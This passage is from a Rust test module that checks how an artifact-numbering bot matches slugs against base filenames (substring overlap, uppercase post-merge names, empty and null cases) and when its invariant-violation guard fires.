    fn layer_b_predicate_rejects_substring_overlap() {
        // Candidate slug whose simple ASCII form is a substring (not the
        // post-merge `<kind>-<digits>-<suffix>.md` shape) of an unrelated
        // base filename. Pre-fix, the ad-hoc `f.contains("{slug}-")` test
        // would have returned true here; the canonical helper returns
        // false because the chars between `prd-` and the suffix `.md`
        // are not all digits.
        let base_files = vec!["prd-auth-system-deprecated.md".to_string()];
        // The candidate is a NEW artifact `prd-auth-system` — its slug is
        // a prefix of the unrelated base filename's slug. Must not be
        // classified as already-in-base.
        assert!(
            !slug_exists_in_filenames("prd-auth-system", &base_files),
            "substring-overlap match must NOT count as in-base"
        );
        // Sanity: the legitimate base slug DOES match itself.
        assert!(slug_exists_in_filenames(
            "prd-auth-system-deprecated",
            &base_files
        ));
        // Reverse direction: candidate slug is a SUPERSTRING of an
        // existing base filename's slug — also must NOT match (avoids the
        // mirror false-positive).
        let other_base = vec!["prd-auth.md".to_string()];
        assert!(
            !slug_exists_in_filenames("prd-auth-system", &other_base),
            "candidate slug as superstring of base slug must NOT match"
        );
    }

    /// [Round 2 Sec FINDING-3] Layer B's `exists_in_base` predicate must
    /// match the post-merge uppercase filename (case-insensitive). Without
    /// this, an idempotent re-run of the bot against an already-merged
    /// artifact would falsely raise INVARIANT VIOLATION.
    #[test]
    fn layer_b_predicate_matches_post_merge_uppercase_filename() {
        // Post-merge form: kind prefix uppercase + zero-padded display
        // number + lowercased suffix. Case mixed intentionally.
        let base_files = vec!["PRD-074-auth-system.md".to_string()];
        assert!(
            slug_exists_in_filenames("prd-auth-system", &base_files),
            "post-merge uppercase filename must match the lowercase slug"
        );
        // Negative control: a slug that doesn't share the suffix MUST NOT
        // match the same post-merge filename. Guards against an over-
        // permissive case-fold regression.
        assert!(!slug_exists_in_filenames(
            "prd-billing-service",
            &base_files
        ));
        // Mid-case (e.g. PRD-074-Auth-System.md from a typo'd rename)
        // should also match — case folding is total over ASCII.
        let mixed = vec!["PRD-074-Auth-System.md".to_string()];
        assert!(slug_exists_in_filenames("prd-auth-system", &mixed));
    }

    // ── [Round 3 Code FINDING-4] Layer B INTEGRATION coverage ─────────
    //
    // The two tests above exercise the predicate `slug_exists_in_filenames`
    // в isolation. The audit's concern: a future refactor of
    // `compute_assignment_plan` could regress the *consumer* of that
    // predicate (the CRIT-2 invariant guard) without the predicate
    // tests catching it. The four tests below pin the integration site
    // by injecting fixture `base_files_per_kind` directly via the new
    // pure helper [`compute_assignment_plan_with_bases`] — no remote
    // git stand-up required, so we can construct the precise
    // (slug, base_files) pairs needed для each scenario.
    //
    // Coverage matrix (4 cases):
    //   1. False-positive guard — substring overlap
    //      (`prd-auth-system` vs `prd-auth-system-deprecated.md`):
    //      tampered NEW artifact must trigger INVARIANT VIOLATION.
    //   2. False-negative guard — post-merge uppercase filename
    //      (`prd-auth-system` vs `PRD-074-auth-system.md`):
    //      idempotent re-run must NOT trigger violation.
    //   3. Empty-base allow path: no artifacts in base for this kind →
    //      candidate с `current_assigned: Some(_)` is allowed
    //      through (first-of-kind idempotent re-run).
    //   4. Null candidate path: candidate с `current_assigned: None` →
    //      Layer B doesn't fire regardless of base_files.

    /// [Round 3 Code FINDING-4] Layer B INTEGRATION — false positive:
    /// candidate slug `prd-auth-system` overlaps base filename
    /// `prd-auth-system-deprecated.md` as substring. Tampered new
    /// artifact carrying pre-set `assigned_number` must trigger CRIT-2
    /// INVARIANT VIOLATION at the integration site (not just the
    /// predicate). Pre-fix consumer used `f.contains("{slug}-")` which
    /// would have classified the candidate as already-in-base and
    /// silently allowed the violation.
    #[test]
    fn compute_plan_layer_b_integration_substring_overlap_triggers_violation() {
        use std::collections::BTreeMap;

        let workspace = TempDir::new().unwrap();
        let candidates = vec![Candidate {
            slug: "prd-auth-system".to_string(),
            kind: ArtifactKind::Prd,
            path: workspace.path().join(".forgeplan/prds/prd-auth-system.md"),
            predicted_number: Some(75),
            current_assigned: Some(75), // tampered — pre-set on a new artifact
        }];
        let mut max_per_kind: BTreeMap<String, Option<u32>> = BTreeMap::new();
        max_per_kind.insert("prds".to_string(), Some(74));
        let mut base_files_per_kind: BTreeMap<String, Vec<String>> = BTreeMap::new();
        base_files_per_kind.insert(
            "prds".to_string(),
            vec!["prd-auth-system-deprecated.md".to_string()],
        );

        let result = compute_assignment_plan_with_bases(
            workspace.path(),
            "dev",
            &candidates,
            &max_per_kind,
            &base_files_per_kind,
        );
        assert!(
            result.is_err(),
            "substring-overlap candidate must trigger CRIT-2 INVARIANT VIOLATION at integration site"
        );
        let err_msg = format!("{:?}", result.unwrap_err());
        assert!(
            err_msg.contains("invariant violation") || err_msg.contains("INVARIANT VIOLATION"),
            "error message must mention invariant violation, got: {err_msg}"
        );
        assert!(
            err_msg.contains("prd-auth-system"),
            "error message must reference the candidate slug, got: {err_msg}"
        );
    }

    /// [Round 3 Code FINDING-4] Layer B INTEGRATION — false negative:
    /// candidate slug `prd-auth-system` против post-merge uppercase
    /// filename `PRD-074-auth-system.md`. Idempotent re-run must NOT
    /// trigger violation (the predicate's case-insensitive match
    /// classifies it as already-in-base correctly).
    #[test]
    fn compute_plan_layer_b_integration_post_merge_uppercase_allowed() {
        use std::collections::BTreeMap;

        let workspace = TempDir::new().unwrap();
        let candidates = vec![Candidate {
            slug: "prd-auth-system".to_string(),
            kind: ArtifactKind::Prd,
            path: workspace
                .path()
                .join(".forgeplan/prds/PRD-074-auth-system.md"),
            predicted_number: Some(74),
            current_assigned: Some(74), // legitimate — already merged
        }];
        let mut max_per_kind: BTreeMap<String, Option<u32>> = BTreeMap::new();
        max_per_kind.insert("prds".to_string(), Some(74));
        let mut base_files_per_kind: BTreeMap<String, Vec<String>> = BTreeMap::new();
        base_files_per_kind.insert(
            "prds".to_string(),
            vec!["PRD-074-auth-system.md".to_string()],
        );

        let result = compute_assignment_plan_with_bases(
            workspace.path(),
            "dev",
            &candidates,
            &max_per_kind,
            &base_files_per_kind,
        );
        let plan = result.expect(
            "post-merge uppercase filename must classify candidate as already-in-base \
             (idempotent re-run, no violation)",
        );
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].assigned_number, 74);
        assert!(plan[0].already_assigned);
    }

    /// [Round 3 Code FINDING-4] Layer B INTEGRATION — empty base allow:
    /// when no artifacts exist in base for the candidate's kind,
    /// Layer B skips the violation check (first-of-kind idempotent
    /// re-run is legitimate).
    #[test]
    fn compute_plan_layer_b_integration_empty_base_allows_assigned_candidate() {
        use std::collections::BTreeMap;

        let workspace = TempDir::new().unwrap();
        let candidates = vec![Candidate {
            slug: "prd-first-of-kind".to_string(),
            kind: ArtifactKind::Prd,
            path: workspace
                .path()
                .join(".forgeplan/prds/prd-first-of-kind.md"),
            predicted_number: Some(1),
            current_assigned: Some(1), // first-of-kind, allowed when base empty
        }];
        let mut max_per_kind: BTreeMap<String, Option<u32>> = BTreeMap::new();
        max_per_kind.insert("prds".to_string(), None);
        let mut base_files_per_kind: BTreeMap<String, Vec<String>> = BTreeMap::new();
        base_files_per_kind.insert("prds".to_string(), Vec::new());

        let result = compute_assignment_plan_with_bases(
            workspace.path(),
            "dev",
            &candidates,
            &max_per_kind,
            &base_files_per_kind,
        );
        let plan =
            result.expect("empty base must allow first-of-kind candidate with current_assigned");
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].assigned_number, 1);
        assert!(plan[0].already_assigned);
    }

    /// [Round 3 Code FINDING-4] Layer B INTEGRATION — null candidate
    /// path: a candidate с `current_assigned: None` is не subject to
    /// Layer B's invariant check regardless of base_files contents.
    /// This is the happy path for new artifacts — they get fresh
    /// numbers minted from `max_in_base + 1`.
    #[test]
    fn compute_plan_layer_b_integration_null_candidate_skips_check() {
        use std::collections::BTreeMap;

        let workspace = TempDir::new().unwrap();
        let candidates = vec![Candidate {
            slug: "prd-new-feature".to_string(),
            kind: ArtifactKind::Prd,
            path: workspace.path().join(".forgeplan/prds/prd-new-feature.md"),
            predicted_number: Some(75),
            current_assigned: None, // happy path — bot will mint number
        }];
        let mut max_per_kind: BTreeMap<String, Option<u32>> = BTreeMap::new();
        max_per_kind.insert("prds".to_string(), Some(74));
        // Base files contain other artifacts — irrelevant since candidate is null.
        let mut base_files_per_kind: BTreeMap<String, Vec<String>> = BTreeMap::new();
        base_files_per_kind.insert(
            "prds".to_string(),
            vec![
                "PRD-073-existing.md".to_string(),
                "PRD-074-other.md".to_string(),
            ],
        );

        let plan = compute_assignment_plan_with_bases(
            workspace.path(),
            "dev",
            &candidates,
            &max_per_kind,
            &base_files_per_kind,
        )
        .expect("null candidate path must not trigger Layer B violation");
        assert_eq!(plan.len(), 1);
        assert_eq!(
            plan[0].assigned_number, 75,
            "null candidate must mint max_in_base + 1 = 75"
        );
        assert!(!plan[0].already_assigned);
    }
}
